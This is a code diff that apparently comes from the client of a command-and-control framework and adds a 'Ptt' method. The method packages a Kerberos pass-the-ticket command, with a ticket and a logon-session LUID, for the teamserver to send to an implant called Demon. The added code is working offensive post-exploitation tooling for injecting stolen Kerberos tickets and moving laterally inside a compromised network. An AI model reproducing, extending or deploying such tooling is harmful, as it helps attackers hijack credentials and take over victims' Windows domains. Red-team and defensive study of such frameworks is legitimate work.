@@ -532,3 +532,24 @@ auto CommandExecute::Purge( const QString &TaskID, QString Argument ) -> void
 
     NewPackageCommand( DemonCommandInstance->Teamserver, Body );
 }
+
+auto CommandExecute::Ptt( const QString &TaskID, QString Ticket, QString Luid ) -> void
+{
+    auto Body = Util::Packager::Body_t {
+            .SubEvent = Util::Packager::Session::SendCommand,
+            .Info = {
+                    { "TaskID",      TaskID.toStdString() },
+                    { "DemonID",     this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
+
+                    { "CommandID",   to_string( ( int ) Commands::KERBEROS ).c_str() },
+                    { "CommandLine", DemonCommandInstance->CommandInputList[ TaskID ].toStdString() },
+
+                    { "Command",     "ptt" },
+
+                    { "Ticket",    Ticket.toStdString() },
+                    { "Luid",      Luid.toStdString() },
+            },
+    };
+
+    NewPackageCommand( DemonCommandInstance->Teamserver, Body );
+}
